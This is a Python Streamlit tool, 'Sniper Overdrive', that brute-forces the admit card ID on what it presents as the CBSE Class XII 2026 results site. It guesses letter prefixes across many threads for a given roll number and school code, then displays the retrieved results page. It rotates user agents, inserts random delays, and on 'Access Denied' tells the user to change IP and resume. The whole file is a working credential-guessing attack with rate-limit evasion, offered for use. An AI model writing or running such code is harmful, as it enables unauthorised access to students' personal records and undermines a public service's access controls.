import streamlit as st
import requests
from bs4 import BeautifulSoup
import itertools
import string
import time
import random
from concurrent.futures import ThreadPoolExecutor

st.set_page_config(page_title="Sniper Overdrive", page_icon="🎯")
st.title("🎯 Sniper Overdrive: 1-Letter Mode")

# --- Configuration ---
with st.sidebar:
    st.header("Target Data")
    roll_no = st.text_input("Roll Number", value="18602421")
    school_code = st.text_input("School Code", value="45498")
    fixed_suffix = st.text_input("Admit Card Suffix", value="4510")
    
    st.divider()
    st.header("Scan Intensity")
    # NEW: Added Ultra-Short 1-Letter mode
    scan_mode = st.radio(
        "Search Depth:", 
        ["Ultra-Short (1 Letter)", "Standard (2 Letters)", "Deep (3 Letters)"],
        index=0
    )
    include_spaces = st.checkbox("Include Space padding", value=True)
    
    threads = st.slider("Threads (Concurrency):", 1, 50, 30)
    start_combo = st.text_input("Start From:", value="A").upper()

base_url = "https://cbseresults.nic.in/class_xii_b_2026_a/ClassTwelfth_ii26.htm"
post_url = "https://cbseresults.nic.in/class_xii_b_2026_a/ClassTwelfth_ii_2026.asp"

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
]

def check_id_sync(combo):
    # Dynamically builds 7-char or 8-char ID based on combo length
    admit_id = f"{combo}{roll_no[-2:]}{fixed_suffix}"
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': random.choice(UA_POOL),
        'Referer': base_url,
        'Connection': 'close'
    })
    
    try:
        r_init = session.get(base_url, timeout=7)
        soup = BeautifulSoup(r_init.text, 'html.parser')
        
        payload = {'regno': roll_no, 'sch': school_code, 'admid': admit_id}
        for h in soup.find_all('input', type='hidden'):
            payload[h.get('name')] = h.get('value', '')
        payload['B2'] = 'Submit'

        time.sleep(random.uniform(0.1, 0.3))
        response = session.post(post_url, data=payload, timeout=7)
        
        if "Roll No" in response.text and "Invalid" not in response.text:
            return "SUCCESS", (admit_id, response.text)
        if "Access Denied" in response.text:
            return "BLOCKED", combo
    except:
        pass
    return "FAIL", combo

def run_scan():
    # Priority Alphabet (Vowels First)
    vowels = ['A', 'E', 'I', 'O', 'U']
    chars = vowels + [c for c in string.ascii_uppercase if c not in vowels]
    if include_spaces:
        chars.append(" ")
        
    # Translate UI choice to numeric depth
    if "1 Letter" in scan_mode:
        depth = 1
    elif "2 Letters" in scan_mode:
        depth = 2
    else:
        depth = 3
        
    all_combos = ["".join(c) for c in itertools.product(chars, repeat=depth)]
    
    try:
        start_idx = all_combos.index(start_combo)
        search_space = all_combos[start_idx:]
    except ValueError:
        search_space = all_combos

    progress_bar = st.progress(0)
    status_text = st.empty()
    found = False

    st.warning(f"🚀 Sniper Mode Active: {len(search_space)} target paths to look up.")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_combo = {executor.submit(check_id_sync, combo): combo for combo in search_space}
        
        for i, future in enumerate(future_to_combo):
            try:
                res_type, data = future.result()
            except:
                continue
            
            done = i + 1
            progress_bar.progress(min(done / len(search_space), 1.0))
            
            display_id = data[0] if res_type == "SUCCESS" else data
            status_text.write(f"🔍 Testing: **'{display_id}'** | {done}/{len(search_space)}")

            if res_type == "SUCCESS":
                admit_id, html = data
                st.success(f"✅ TARGET ACQUIRED: {admit_id}")
                st.balloons()
                st.components.v1.html(html, height=800, scrolling=True)
                found = True
                executor.shutdown(wait=False, cancel_futures=True)
                break
            
            if res_type == "BLOCKED":
                st.error(f"🛑 Server hit limit at '{data}'. Change your IP and resume.")
                executor.shutdown(wait=False, cancel_futures=True)
                return

    if not found:
        st.info("Scan complete. No matching 7-character ID found in this range.")

if st.button("🚀 Ignite Sniper Scan"):
    run_scan()